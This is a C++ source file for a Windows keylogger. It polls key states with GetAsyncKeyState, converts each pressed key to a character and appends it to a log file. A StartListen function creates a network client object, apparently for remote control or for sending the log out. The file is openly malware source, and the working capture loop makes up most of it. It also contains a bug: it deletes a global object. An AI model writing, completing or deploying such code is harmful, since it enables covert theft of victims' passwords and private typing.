#pragma once
#include "stdafx.h"
#include "keylogger.h"
#include "utils.h"
#include "Client.h"

using namespace std;

// indicate keylogger state (used in the loop)
bool IsKeyLoggerRunning = false;

LogFile log_file;

void KeyLoggerLoop()
{
	char key[2];
	while (IsKeyLoggerRunning)
	{
		for (int i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{

				key[0] = (char)MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
				key[1] = 0;
				//MessageBoxA(0, key, "KEY", MB_OK); // just to debug
				log_file.AppendString((char*)key);
			}
		}
		Sleep(100);
	}
}

void StopKeyLogger()
{
	IsKeyLoggerRunning = false;
}

void StartKeyLogger()
{ 
	// do initialization code
	IsKeyLoggerRunning = true;
	
	

	// finally loop
	KeyLoggerLoop();


	// do finalization code
	delete &log_file;
}

void StartListen()
{
	Client client;
}
